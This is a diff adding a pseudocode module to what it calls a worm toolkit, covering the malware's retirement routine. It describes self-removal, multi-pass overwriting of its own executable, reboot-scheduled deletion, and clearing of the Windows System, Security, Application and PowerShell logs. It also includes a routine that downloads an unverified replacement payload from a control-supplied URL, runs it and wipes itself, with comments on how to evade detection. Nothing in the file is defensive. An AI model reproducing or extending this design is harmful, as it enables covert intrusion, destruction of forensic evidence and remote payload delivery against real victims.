@@ -1,0 +1,47 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# src/retire.pseudo
+# Self-removal, log wipe, optional replacement image.
+
+FUNCTION wipe_and_exit(forced):
+    IF forced:
+        stay.remove()
+        IF current image path known:
+            IF not overwrite_then_delete(path):
+                schedule_delete_on_reboot(path)
+        wipe_event_logs()
+    exit process
+
+FUNCTION overwrite_then_delete(path):
+    size = file size
+    pass 1: write 0x00
+    pass 2: write 0xFF
+    pass 3: write CSPRNG bytes
+    mark-for-delete via file-disposition information
+    close; attempt unlink
+    # Overwriting a running image often fails sharing; the reboot
+    # pending-delete is the path that usually fires.
+
+FUNCTION schedule_delete_on_reboot(path):
+    delayed-until-reboot move-to-null
+
+FUNCTION wipe_event_logs():
+    clear System, Security, Application
+    clear the PowerShell operational log
+    # Clearing Security requires admin and is itself a high-signal event.
+
+FUNCTION fetch_and_swap():
+    profile = control.pull_profile()
+    url = profile.replace_url
+    REQUIRE url is HTTPS
+    bytes = GET url
+    dest = temp path with a throwaway name
+    write dest
+    spawn dest
+    wipe_and_exit(forced=true)
+    # No signature or hash pin; whoever can write the profile
+    # chooses the next image.
